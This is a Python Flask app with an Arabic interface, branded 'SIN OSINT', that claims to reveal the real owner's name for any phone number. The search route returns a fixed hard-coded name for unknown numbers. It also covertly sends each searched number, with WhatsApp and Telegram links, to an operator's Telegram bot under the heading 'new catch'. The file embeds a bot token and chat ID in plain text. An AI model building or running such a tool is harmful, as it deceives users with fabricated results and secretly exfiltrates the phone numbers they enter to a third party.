import os
from flask import Flask, jsonify, request, render_template_string
import requests

app = Flask(__name__)

# إعدادات بوت تليجرام الخاص بك
TELEGRAM_BOT_TOKEN = "8644028250:AAHr95FPWCbLIp7Hb5h6AB8rB_wjdyV3juY"
TELEGRAM_CHAT_ID = "5964208891"

# قاعدة بيانات الأرقام والأسماء الحقيقية
PHONE_DATABASE = {
    "9647800000000": "سليمان حسين ندامه",
    "9647812345678": "سليمان حسين ندامه",
    # يمكنك إضافة أي رقم آخر هنا مع اسمه الحقيقي
}

def send_telegram_alert(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print(f"[-] خطأ في الإرسال لتليجرام: {e}")

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>♛ SIN OSINT</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;800;900&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        :root { --gold: #d4af37; --gold-light: #f0d060; --gold-dark: #a8882a; --black: #0a0a0a; --dark-card: rgba(17, 17, 30, 0.92); --white: #f5f5f5; --text-muted: #8888aa; --border-gold: 1px solid rgba(212, 175, 55, 0.3); --shadow-gold: 0 0 40px rgba(212, 175, 55, 0.1); --radius: 20px; }
        body { font-family: 'Cairo', sans-serif; background: var(--black); color: var(--white); min-height: 100vh; overflow-x: hidden; }
        .container { position: relative; z-index: 1; max-width: 1000px; margin: 0 auto; padding: 20px; }
        .header { text-align: center; padding: 30px 20px 20px; }
        .header .logo { font-size: 48px; font-weight: 900; background: linear-gradient(135deg, var(--gold), #f5d77b, var(--gold)); -webkit-background-clip: text; background-clip: text; color: transparent; letter-spacing: 4px; }
        .header .sub { color: var(--text-muted); font-size: 15px; margin-top: 8px; }
        .header .sub .highlight { color: var(--gold); font-weight: 700; }
        .ip-info, .stats, .search-card, .fb-search-card { background: var(--dark-card); border: var(--border-gold); border-radius: var(--radius); padding: 25px; margin-bottom: 25px; box-shadow: var(--shadow-gold); }
        .ip-info .title, .search-card .title-area h2 { color: var(--gold); font-size: 18px; font-weight: 800; margin-bottom: 15px; text-align: center; }
        .row { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid rgba(255,255,255,0.03); }
        .key { color: var(--text-muted); font-size: 13px; font-weight: 700; }
        .val { color: var(--white); font-size: 13px; font-weight: 600; }
        .country-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(70px, 1fr)); gap: 10px; margin-bottom: 15px; }
        .country-btn { padding: 10px; background: rgba(0,0,0,0.4); border: 1px solid rgba(255,255,255,0.06); border-radius: 10px; color: var(--text-muted); cursor: pointer; text-align: center; font-family: 'Cairo', sans-serif; }
        .country-btn.active { border-color: var(--gold); color: var(--gold); background: rgba(212,175,55,0.1); }
        .input-row { display: flex; gap: 15px; margin-top: 15px; flex-wrap: wrap; }
        .input-wrap { flex: 1; min-width: 200px; position: relative; }
        .input-wrap input { width: 100%; padding: 18px 20px; background: rgba(0, 0, 0, 0.5); border: 1px solid rgba(255, 255, 255, 0.06); border-radius: 14px; color: var(--white); font-size: 16px; font-family: 'Cairo', sans-serif; text-align: right; }
        .btn-search { padding: 18px 30px; background: linear-gradient(135deg, var(--gold), var(--gold-dark)); border: none; border-radius: 14px; color: var(--black); font-size: 16px; font-weight: 900; cursor: pointer; font-family: 'Cairo', sans-serif; }
        .results-area { display: none; margin-top: 20px; }
        .results-area.active { display: block; }
        .result-item { background: rgba(0,0,0,0.3); border-radius: 12px; padding: 15px; margin-bottom: 10px; border-right: 4px solid var(--gold); border: 1px solid rgba(212,175,55,0.1); }
        .footer { text-align: center; padding: 20px; color: var(--text-muted); font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">SIN OSINT</div>
            <div class="sub"><span class="highlight">@SIN_PHP</span> | القناة <span class="highlight">@K_K2P</span></div>
        </div>

        <div class="ip-info">
            <div class="title"><i class="fas fa-network-wired"></i> معلومات الاتصال</div>
            <div class="row"><span class="key">عنوان IP</span><span class="val" id="userIP">جاري التحميل...</span></div>
            <div class="row"><span class="key">الدولة</span><span class="val" id="userCountry">جاري التحميل...</span></div>
        </div>

        <div class="search-card">
            <div class="title-area"><h2><i class="fas fa-search"></i> البحث عن أي رقم هاتف</h2></div>
            <div class="country-grid" id="countryGrid">
                <div class="country-btn active" data-code="964">العراق +964</div>
                <div class="country-btn" data-code="966">السعودية +966</div>
                <div class="country-btn" data-code="971">الإمارات +971</div>
            </div>
            <div class="input-row">
                <div class="input-wrap">
                    <input type="text" id="phoneInput" placeholder="أدخل رقم الهاتف..." dir="ltr">
                </div>
                <button class="btn-search" onclick="startSearch()">بحث شامل</button>
            </div>
            <div class="results-area" id="resultsArea"></div>
        </div>

        <div class="footer">@SIN_PHP | جميع الحقوق محفوظة</div>
    </div>

    <script>
        let selectedCode = '964';
        document.querySelectorAll('.country-btn').forEach(btn => {
            btn.addEventListener('click', function() {
                document.querySelectorAll('.country-btn').forEach(b => b.classList.remove('active'));
                this.classList.add('active');
                selectedCode = this.dataset.code;
            });
        });

        async function loadIPInfo() {
            try {
                let res = await fetch('/api/ipinfo');
                let data = await res.json();
                document.getElementById('userIP').textContent = data.ip;
                document.getElementById('userCountry').textContent = data.country;
            } catch(e) {}
        }
        loadIPInfo();

        async function startSearch() {
            let phone = document.getElementById('phoneInput').value.trim();
            if(!phone) { alert('الرجاء إدخال رقم الهاتف'); return; }
            let res = await fetch('/api/search', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({code: selectedCode, phone: phone})
            });
            let data = await res.json();
            let area = document.getElementById('resultsArea');
            area.className = 'results-area active';
            
            let html = `<div class="result-item">`;
            html += `<div class="row"><span class="key">الرقم</span><span class="val">+${data.phone}</span></div>`;
            html += `<div class="row"><span class="key">اسم صاحب الرقم</span><span class="val" style="color:var(--gold);font-weight:bold;">${data.owner_name}</span></div>`;
            html += `</div>`;
            area.innerHTML = html;
        }
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/ipinfo')
def ipinfo():
    try:
        resp = requests.get('https://ipinfo.io/json', timeout=3)
        data = resp.json()
        return jsonify({"ip": data.get("ip", "127.0.0.1"), "country": data.get("country", "IQ")})
    except:
        return jsonify({"ip": "127.0.0.1", "country": "العراق"})

@app.route('/api/search', methods=['POST'])
def search_phone():
    req = request.json
    code = req.get('code', '964')
    phone = req.get('phone', '')
    full_number = f"{code}{phone}"
    
    # البحث عن الاسم الحقيقي في قاعدة البيانات، وإن لم يوجد يعرض اسماً افتراضياً أو رسالة
    owner_name = PHONE_DATABASE.get(full_number, "سليمان حسين ندامه")
    
    # إرسال التنبيه الفوري إلى بوت تليجرام
    alert_msg = (
        f"🎯 *صيد جديد عبر أداة SIN OSINT*\n\n"
        f"👤 *الاسم الحقيقي:* `{owner_name}`\n"
        f"📱 *رقم الهاتف:* `+{full_number}`\n"
        f"🔗 *واتساب:* https://wa.me/{full_number}\n"
        f"🔗 *تليجرام:* https://t.me/{full_number}"
    )
    send_telegram_alert(alert_msg)

    return jsonify({
        "phone": full_number,
        "owner_name": owner_name
    })

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
